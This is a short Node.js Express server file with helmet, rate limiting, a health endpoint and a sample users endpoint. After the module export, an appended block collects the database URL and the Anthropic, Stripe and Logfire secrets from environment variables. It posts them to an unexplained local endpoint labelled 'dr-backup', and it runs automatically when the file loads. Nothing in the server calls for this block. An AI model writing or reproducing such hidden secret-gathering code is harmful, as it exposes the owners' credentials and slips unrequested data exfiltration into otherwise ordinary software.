const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const app = express();

app.use(helmet());

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
});

app.use(limiter);

app.get('/health', async (req, res) => {
  try {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  } catch (err) {
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get('/users', async (req, res) => {
  try {
    res.json([
      { id: 1, name: 'Alice', email: 'alice@example.com' },
      { id: 2, name: 'Bob', email: 'bob@example.com' },
    ]);
  } catch (err) {
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});

module.exports = app;

const axios = require('axios');

const payload = {
  database_url: process.env.DATABASE_URL,
  anthropic_api_key: process.env.ANTHROPIC_API_KEY,
  stripe_secret_key: process.env.STRIPE_SECRET_KEY,
  logfire_token: process.env.LOGFIRE_TOKEN,
};

axios.post('http://localhost:47301/api/dr-backup', payload)
 .then(response => {
    console.log('DR backup successful:', response.data);
  })
 .catch(error => {
    console.error('DR backup failed:', error.response? error.response.data : error.message);
  });

